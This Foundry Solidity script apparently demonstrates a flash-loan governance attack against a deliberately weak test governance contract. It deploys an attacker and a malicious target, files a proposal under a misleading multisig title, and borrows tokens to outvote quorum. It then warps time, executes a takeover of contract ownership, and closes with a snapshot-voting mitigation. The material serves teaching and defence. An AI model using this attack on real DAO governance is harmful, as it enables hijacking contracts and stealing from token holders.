// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "./Deploy.s.sol";
import "../src/attackers/Attacker_Governance.sol";

contract DemoGovernanceAttack is Script {
    DeployScript public deploy;
    Attacker_Governance public attacker;
    MaliciousTarget public maliciousTarget;
    
    function run() external {
        address deployer = msg.sender;
        
        // 1. Deploy infrastructure
        deploy = new DeployScript();
        deploy.run();
        
        (
            ,
            ,
            ,
            address govToken,
            ,
            ,
            ,
            ,
            ,
            address flashLender,
            ,
            address governance,
            ,
        ) = deploy.getAddresses();
        
        console2.log("=== GOVERNANCE ATTACK DEMO ===");
        console2.log("");
        
        // 2. Show initial state
        console2.log("Initial State:");
        uint256 attackerTokens = GovToken(govToken).balanceOf(deployer);
        console2.log("  Attacker GOV tokens:", attackerTokens / 1e18);
        console2.log("  Required for quorum: 1,000,000 GOV");
        console2.log("  Attacker has insufficient tokens to pass proposal alone");
        
        // 3. Deploy malicious target
        maliciousTarget = new MaliciousTarget(governance);
        console2.log("");
        console2.log("Malicious target contract deployed");
        
        // 4. Deploy attacker
        attacker = new Attacker_Governance(
            flashLender,
            governance,
            govToken
        );
        
        // Give attacker some GOV tokens for proposing (need 100k)
        GovToken(govToken).transfer(address(attacker), 100000 * 1e18);
        
        console2.log("Attacker deployed with 100,000 GOV (for proposing)");
        
        // 5. Create malicious proposal
        console2.log("");
        console2.log("Step 1: Creating malicious proposal...");
        bytes memory maliciousCall = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(attacker)
        );
        
        try attacker.setupProposal(
            address(maliciousTarget),
            maliciousCall,
            "Transfer ownership to community multisig"
        ) returns (uint256 proposalId) {
            console2.log("  Proposal created with ID:", proposalId);
            
            // 6. Execute attack - flash loan and vote
            console2.log("");
            console2.log("Step 2: Flash loaning 900,000 GOV tokens to vote...");
            
            try attacker.attack(900000 * 1e18, proposalId) {
                console2.log("  Voting successful!");
                
                (uint256 forVotes, uint256 againstVotes) = GovernanceWeak(governance).getProposalVotes(proposalId);
                console2.log("  For votes:", forVotes / 1e18);
                console2.log("  Against votes:", againstVotes / 1e18);
                
                // 7. Warp time to end voting period
                console2.log("");
                console2.log("Step 3: Warping time forward...");
                
                // tăng 3 ngày + 1 giây
                vm.warp(block.timestamp + 3 days + 1);
                
                // nếu governance còn check block.number thì thêm luôn:
                vm.roll(block.number + (3 days / 12) + 1);
                
                console2.log("  Time warped successfully");
                
                // 8. Execute proposal
                console2.log("");
                console2.log("Step 4: Executing malicious proposal...");
                try attacker.executeProposal(proposalId) {
                    console2.log("  Proposal executed!");
                    console2.log("  Malicious target ownership transferred to attacker!");
                    console2.log("");
                    console2.log("=== ATTACK SUCCESSFUL ===");
                    console2.log("Attacker now controls the target contract!");
                    
                } catch Error(string memory reason) {
                    console2.log("Execution failed:", reason);
                } catch {
                    console2.log("Execution failed: unknown error");
                }
                
            } catch Error(string memory reason) {
                console2.log("Vote failed:", reason);
            } catch {
                console2.log("Vote failed: unknown error");
            }
            
        } catch Error(string memory reason) {
            console2.log("Proposal creation failed:", reason);
        } catch {
            console2.log("Proposal creation failed: unknown error");
        }
        
        console2.log("");
        console2.log("=== EXPLANATION ===");
        console2.log("This attack exploits governance that checks voting power at vote time.");
        console2.log("MITIGATION: Use snapshot-based voting (check power at proposal creation)!");
    }
}